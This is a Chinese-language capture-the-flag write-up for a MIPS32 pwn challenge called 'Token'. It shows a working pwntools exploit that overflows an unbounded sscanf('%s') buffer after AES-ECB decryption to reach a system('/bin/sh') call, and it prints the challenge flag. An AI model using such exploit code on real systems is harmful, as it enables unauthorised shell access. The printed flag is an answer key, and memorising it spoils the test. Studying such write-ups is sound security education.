# Token

## 题目简述

目标是无 PIE 的 MIPS32 little-endian 程序。服务先发送随机 16 字节 AES 密钥，接收带 15 字节头的 AES-ECB 数据；解密后 `parse()` 用无宽度限制的 `sscanf("%s")` 把 `t=` 值写入 16 字节栈缓冲区。目标是在 MIPS 缺少易链式 `ret` gadget 的条件下完成一次性 ret2system。

## 解题过程

程序日志路径在 `0x40104c` 存在等价于 `system($s8+0x18)` 的调用。溢出保存的 `$s8` 与 `$ra`，让返回地址落到该位置，并使 `$s8+0x18` 指向可控全局 `input_buf` 中的 `/bin/sh`。

地址含有高位 NUL，而 `%s` 遇 NUL 停止。利用两个 `t=` 字段分别完成覆盖：第一个写 20 字节填充、垃圾 `$s8` 和 `$ra` 的低三字节；第二个再写 20 字节填充和 `$s8` 的低三字节，借 `sscanf` 自动追加的终止 NUL 补齐最高字节。

```python
key = p.recvn(16)
plain = flat(
    b"t=", b"A" * 20, b"0000", p32(0x40104c)[:3],
    b"&t=", b"A" * 20, p32(0x41410f)[:3],
    b"&tz=1"
)
ciphertext = AES.new(key, AES.MODE_ECB).encrypt(pad(plain, 16))
```

头部只有四个特定位被检查，官方可用值为 `LExxxxxGOxxxxxx`。在密文尾部再追加一个 16 字节原始块，把命令放进全局 `input_buf`：

```python
packet = b"LExxxxxGOxxxxxx" + ciphertext + b"AAAAAAAA/bin/sh\x00"
p.send(packet)
```

该尾块也会在栈上的 `decrypted` 副本中被 AES 解密成无关垃圾，但全局 `input_buf` 保留收到的原始字节；`$s8+0x18` 指向的正是后者中的 `/bin/sh`。ECB 让前面合法加密块不会受尾块影响。

最终 `system($s8+0x18)` 执行 `/bin/sh`，读取 `byuctf{re4lly_h4rd_t0_d0_R0P_when_r3turn_d0esn't_ex1st}`。

## 方法总结

这条链同时利用了无界 `%s`、重复参数解析的终止 NUL、固定代码/全局地址和 ECB 分组独立性。MIPS ROP gadget 稀少时，应寻找一次调用即可完成目标的现有基本块，并围绕调用约定精确控制保存寄存器。
